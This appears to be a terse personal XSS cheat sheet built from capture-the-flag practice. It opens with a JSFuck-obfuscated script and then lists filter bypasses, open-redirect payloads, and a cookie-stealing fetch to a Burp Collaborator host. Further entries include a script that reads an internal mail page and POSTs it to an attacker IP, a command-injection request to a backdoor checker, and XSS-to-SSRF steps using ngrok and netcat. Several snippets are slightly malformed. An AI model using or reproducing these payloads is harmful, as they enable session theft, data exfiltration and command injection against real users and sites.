[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]+(!![]+[])[+[]]+(![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]]+[+!+[]]+[!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]])()
```
>replace(/[<>]/g, '')
>use URL Encoding and 
```
"onfocus=alert(1337) autofocus="
```

> xss common bypass alert()
```
<img src=javascript:alert('XSS')>
<script>
confirm("This is a malicious alert");
</script>

<script>
prompt("Enter your password:");
</script>


<script>
document.write("<script>alert('This is a malicious alert');</script>");
</script>


<script>eval('alert("XSS")')</script>

<script/src=data:,alert()>

<script>Function('alert("XSS")')()</script>

<script>setTimeout('alert("XSS")', 1000)</script>

<script>setInterval('alert("XSS")', 1000)</script>

<script>document.execCommand('alert', false, 'XSS')</script>

<script>execScript('alert("XSS")')</script>

<script>
var range = document.createRange();
var fragment = range.createContextualFragment('<script>alert("XSS")</script>');
document.body.appendChild(fragment);
</script>


<script>
var crypto = window.crypto || window.msCrypto;
var request = crypto.generateCRMFRequest();
console.log(request);
</script>
```
> xss t open red
```
<script>location.replace('https://malicious-site.com')</script>

<script>location.assign('https://malicious-site.com')</script>
```
>xss script to JavaScript
```
<a href="javascript:open('javascript:alert(1)')">Click me</a>
```
```
<iframe srcdoc="<script>alert('XSS')</script>"></iframe>
```
>XMLHttpRequest.open()
```
<script>
var xhr = new XMLHttpRequest();
xhr.open("GET", "https://malicious-site.com",/ true);
xhr.send();
</script>
```
```
<script>
var xhr = new XMLHttpRequest();
xhr.open("GET", "https://example.com",/ true);
xhr.send('<script>alert("XSS")</script>');
</script>
```
>jQuery
```
<script>
$.ajax({
    url: 'https://malicious-site.com',/
    type: 'GET',
    success: function(response) {
        alert('XSS');
    }
});
</script>
```
-
>xss steall cookie
> python
```
var http = new XMLHttpRequest();
var url = 'http://127.0.0.1/admin/backdoorchecker.php';
var params = 'orem=dir | ping -n 5 10.10.14.8';
http.open('POST', url, true);
http.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
http.withCredentials = true;
http.send(params);
```
>file.js
>next
```
python3 -m http.server -m 80
```
---
> way next
```
//apni.js var url="http://mail.stacked.htb/"  //targeturl(internal wep application) var xhr=new XMLHttpRequest();  xhr.open("GET", url, false);  xhr.send(); var resp=xhr.responseText; //transferring HTTP response to us var xhr2=new XMLHttpRequest();  xhr2.open("POST", 'http://10.10.14.89:443/', false); xhr2.send(resp);
```
```
<script src="http://10.10.14.89/apni.js"></script>
```
>burp suite use to steall
```
</script> <script>fetch('https://<Collaborator>', {method: 'POST',mode: 'no-cors',body:document.cookie});</script>//
```
-
>bypass add
```
X-Forwarded-For: 1.1.1.1

```
->xss to ssrf
-step 1

```
<img src="http://774a8fa27a0a.ngrok.io/bogus.php" alt="Image">

<a href="#" onclick="alert(1)">XSS</a>

<a href="https://google.com">xss</a>

<svg width="100" height="100">
  <circle cx="50" cy="50" r="40" stroke="green" stroke-width="4" fill="yellow" />
</svg>

<a href="https://google.com">xss</a>

<iframe width="560" height="315" src="http://774a8fa27a0a.ngrok.io/bogus.svg"></iframe>

```
>next ngrok http port
>next netcat -l -k -v port




